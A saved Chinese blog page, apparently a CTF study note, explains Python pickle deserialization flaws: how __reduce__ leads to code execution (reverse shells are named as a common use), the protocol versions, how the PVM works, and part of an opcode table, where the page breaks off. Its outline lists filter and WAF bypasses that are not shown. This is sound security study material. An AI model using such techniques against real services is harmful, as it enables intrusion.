@@ -1,0 +1,560 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Pickle反序列化漏洞小结 | Ec3o</title><meta name="keywords" content="Python安全"><meta name="author" content="Ec3o"><meta name="copyright" content="Ec3o"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Pickle反序列化漏洞小结"><meta name="application-name" content="Pickle反序列化漏洞小结"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Pickle反序列化漏洞小结"><meta property="og:url" content="http://tech.ec3o.fun/2024/10/22/Web-Basic/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/index.html"><meta property="og:site_name" content="Ec3o"><meta property="og:description" content="Pickle 反序列化漏洞小结Pickle是一种栈语言，有不同的编写方式，基于一个轻量的PVM(Pickle Virtual Machine)进行工作. 序列化与反序列化pickle模块在序列化和反序列化时使用__reduce__方法来进行反序列化，在定义模块时取消定义即可.  pickle.dum"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/blackhole.png"><meta property="article:author" content="Ec3o"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/blackhole.png"><meta name="description" content="Pickle 反序列化漏洞小结Pickle是一种栈语言，有不同的编写方式，基于一个轻量的PVM(Pickle Virtual Machine)进行工作. 序列化与反序列化pickle模块在序列化和反序列化时使用__reduce__方法来进行反序列化，在定义模块时取消定义即可.  pickle.dum"><link rel="shortcut icon" href="http://q.qlogo.cn/headimg_dl?dst_uin=2499302531&spec=640&img_type=jpg"><link rel="canonical" href="http://tech.ec3o.fun/2024/10/22/Web-Basic/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"抽刀断水水更流，举杯消愁愁更愁。","backTitle":"无边落木萧萧下，不尽长江滚滚来。"},
+  LA51: undefined,
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Ec3o","link":"链接: ","source":"来源: Ec3o","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Ec3o',
+  title: 'Pickle反序列化漏洞小结',
+  postAI: '',
+  pageFillDescription: 'Pickle 反序列化漏洞小结, 序列化与反序列化, 漏洞的成因, Pickle协议版本, PVM的工作原理, 常见opcode一览表, 常见WAF绕过, 绕过Unpickler.find_class(), 绕过指令过滤, 绕过R指令, 绕过关键字过滤反序列化漏洞小结是一种栈语言有不同的编写方式基于一个轻量的进行工作序列化与反序列化模块在序列化和反序列化时使用方法来进行反序列化在定义模块时取消定义即可其中方法用于把对象转换为可传输的二进制文件或字符串方法用于从文件或字符串中加载序列化的二进制对象漏洞的成因在反序列化时会自动调用对象的方法从而导致远程代码执行及其他代码常见利用有反弹变量覆盖等协议版本当前用于的协议共有种使用的协议版本越高读取生成的所需的版本就要越新版协议是原始的人类可读协议并且向后兼容早期版本的版协议是较早的二进制格式它也与早期版本的兼容版协议是在中引入的它为存储提供了更高效的机制欲了解有关第版协议带来的改进请参阅版协议添加于它具有对对象的显式支持且无法被打开这是目前默认使用的协议也是在要求与其他版本兼容时的推荐协议版协议添加于它支持存储非常大的对象能存储更多种类的对象还包括一些针对数据格式的优化有关第版协议带来改进的信息请参阅的工作原理实际上可以看作一种独立的语言通过对的编写可以进行代码执行覆盖变量等操作直接编写的灵活性比使用序列化生成的代码更高并且有的代码不能通过序列化得到解析能力大于生成能力由以下三部分组成指令处理器从流中读取和参数并对其进行解释处理重复这个动作直到遇到这个结束符后停止最终留在栈顶的值将被作为反序列化对象返回由的实现被用来临时存储数据参数以及对象由的实现为的整个生命周期提供存储常见一览表指令描述具体写法栈上的变化获取一个全局对象或一个模块获得的对象入栈寻找栈中的上一个以之间的第一个数据必须为函数为第二个到第个数据为参数执行该函数或实例化一个对象这个过程中涉及到的数据都出栈函数的返回值或生成的对象入栈相当于和的组合先获取一个全局函数然后寻找栈中的上一个并组合之间的数据为元组以该元组为参数执行全局函数或实例化一个对象这个过程中涉及到的数据都出栈函数返回值或生成的对象入栈实例化一个获得的对象入栈实例化一个字符串对象也可以使用双引号等字符串形式获得的对象入栈实例化一个字符串对象获得的对象入栈实例化一个对象获得的对象入栈实例化一个对象获得的对象入栈选择栈上的第一个对象作为函数第二个对象作为参数第二个对象必须为元组然后调用该函数函数和参数出栈函数的返回值入栈程序结束栈顶的一个元素作为的返回值无向栈中压入一个标记标记入栈寻找栈中的上一个并组合之间的数据为元组标记以及被组合的数据出栈获得的对象入栈向栈中直接压入一个空元组空元组入栈寻找栈中的上一个并组合之间的数据为列表标记以及被组合的数据出栈获得的对象入栈向栈中直接压入一个空列表空列表入栈寻找栈中的上一个并组合之间的数据为字典数据必须有偶数个即呈对标记以及被组合的数据出栈获得的对象入栈向栈中直接压入一个空字典空字典入栈将栈顶对象储存至无将的对象压栈对象被压栈丢弃栈顶对象栈顶对象被丢弃使用栈中的第一个元素储存多个属性名属性值的字典对第二个元素对象实例进行属性设置栈上第一个元素出栈将栈的第一个和第二个对象作为对添加或更新到栈的第三个对象必须为列表或字典列表以数字作为中第一二个元素出栈第三个元素列表或字典添加新值或被更新寻找栈中的上一个组合之间的数据数据必须有偶数个即呈对并全部添加或更新到该之前的一个元素必须为字典中标记以及被组合的数据出栈字典被更新将栈的第一个元素到第二个元素列表中栈顶元素出栈第二个元素列表被更新寻找栈中的上一个组合之间的数据并到该之前的一个元素必须为列表中标记以及被组合的数据出栈列表被更新常见绕过绕过类沙箱逃逸尝试从其他类访问属性获取到对应类从而进行命令执行等操作详见专题绕过指令过滤绕过指令可以看到代码中过滤了指令字节码里不能存在实际上如果没有指令我们同样能够进行函数执行有下面这样一个例子向栈中压入一个空字典然后再通过修改为这段字节码向栈中压入了一个字典并执行字节码由于此时并没有所以这里字节码相当于执行了向对象的属性字典中添加了一对新的键值对如果我们继续向栈中压入命令再次执行字节码时由于已经有了所以会将栈中字节码的前一个元素当作执行也就是绕过关键字过滤强网杯原始使用指令绕过进制编码绕过对于已导入的模块我们可以通过来获取该模块然后通过内置函数来列出模块中的所有属性最终',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-25 12:28:21',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/amiya.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Ec3o</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 1.05rem;">CTF<sup>2</sup></a><a href="/tags/Java-Security/" style="font-size: 1.05rem;">Java Security<sup>1</sup></a><a href="/tags/JavaScript/" style="font-size: 1.05rem;">JavaScript<sup>1</sup></a><a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Java安全<sup>1</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>1</sup></a><a href="/tags/PHP%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">PHP安全<sup>1</sup></a><a href="/tags/Python%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Python安全<sup>1</sup></a><a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" style="font-size: 1.05rem;">原型链污染<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">渗透<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7/" style="font-size: 1.05rem;">红队技巧<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web-Security/" itemprop="url">Web Security</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Python%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Python安全</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Pickle反序列化漏洞小结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-10-22T07:18:58.000Z" title="发表于 2024-10-22 15:18:58">2024-10-22</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-11-25T04:28:21.892Z" title="更新于 2024-11-25 12:28:21">2024-11-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">2.3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Pickle反序列化漏洞小结"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为杭州"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>杭州</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/blackhole.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://tech.ec3o.fun/2024/10/22/Web-Basic/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"><header><a class="post-meta-categories" href="/categories/Web-Security/" itemprop="url">Web Security</a><a href="/tags/Python%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">Python安全</a><h1 id="CrawlerTitle" itemprop="name headline">Pickle反序列化漏洞小结</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Ec3o</span><time itemprop="dateCreated datePublished" datetime="2024-10-22T07:18:58.000Z" title="发表于 2024-10-22 15:18:58">2024-10-22</time><time itemprop="dateCreated datePublished" datetime="2024-11-25T04:28:21.892Z" title="更新于 2024-11-25 12:28:21">2024-11-25</time></header><h1 id="Pickle-反序列化漏洞小结"><a href="#Pickle-反序列化漏洞小结" class="headerlink" title="Pickle 反序列化漏洞小结"></a>Pickle 反序列化漏洞小结</h1><p>Pickle是一种栈语言，有不同的编写方式，基于一个轻量的<strong>PVM</strong>(Pickle Virtual Machine)进行工作.</p>
+<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>pickle模块在序列化和反序列化时使用<code>__reduce__</code>方法来进行反序列化，在定义模块时取消定义即可.</p>
+<ol>
+<li><code>pickle.dump()</code></li>
+<li><code>pickle.load()</code></li>
+<li><code>pickle.dumps()</code></li>
+<li><code>pickle.loads()</code></li>
+</ol>
+<p>其中dump方法用于把Python对象转换为可传输的二进制文件或字符串(dumps);load方法用于从文件或字符串(loads)中加载序列化的二进制Python对象.</p>
+<h2 id="漏洞的成因"><a href="#漏洞的成因" class="headerlink" title="漏洞的成因"></a>漏洞的成因</h2><p>Pickle在反序列化时会自动调用对象的<code>__reduce__</code>方法从而导致远程代码执行及其他代码，常见利用有反弹shell,变量覆盖等.</p>
+<h2 id="Pickle协议版本"><a href="#Pickle协议版本" class="headerlink" title="Pickle协议版本"></a>Pickle协议版本</h2><p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p>
+<ul>
+<li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。</li>
+<li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li>
+<li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-0307"><strong>PEP 307</strong></a>。</li>
+<li>v3 版协议添加于 Python 3.0。它具有对 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li>
+<li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-3154"><strong>PEP 3154</strong></a>。</li>
+</ul>
+<h2 id="PVM的工作原理"><a href="#PVM的工作原理" class="headerlink" title="PVM的工作原理"></a>PVM的工作原理</h2><p>pickle 实际上可以看作一种<strong>独立的语言</strong>，通过对 <code>opcode</code> 的编写可以进行 Python 代码执行、覆盖变量等操作。直接编写的 <code>opcode</code> 灵活性比使用 pickle 序列化生成的代码更高，并且有的代码不能通过 pickle 序列化得到（pickle 解析能力大于 pickle 生成能力）。</p>
+<p>PVM 由以下三部分组成</p>
+<ul>
+<li>指令处理器：从流中读取 <code>opcode</code> 和参数，并对其进行解释处理。重复这个动作，直到遇到。这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。</li>
+<li>stack：由 Python 的 <strong><code>list</code></strong> 实现，被用来临时存储数据、参数以及对象。</li>
+<li>memo：由 Python 的 <strong><code>dict</code></strong> 实现，为 PVM 的整个生命周期提供存储。</li>
+</ul>
+<h2 id="常见opcode一览表"><a href="#常见opcode一览表" class="headerlink" title="常见opcode一览表"></a>常见opcode一览表</h2><table>
+<thead>
+<tr>
+<th align="left">指令</th>
+<th align="left">描述</th>
+<th align="left">具体写法</th>
+<th align="left">栈上的变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">c</td>
+<td align="left">获取一个全局对象或import一个模块</td>
+<td align="left">c[module]\n[instance]\n</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">o</td>
+<td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td align="left">o</td>
+<td align="left">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td align="left">i</td>
+<td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td align="left">i[module]\n[callable]\n</td>
+<td align="left">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td align="left">N</td>
+<td align="left">实例化一个None</td>
+<td align="left">N</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">S</td>
+<td align="left">实例化一个字符串对象</td>
+<td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">V</td>
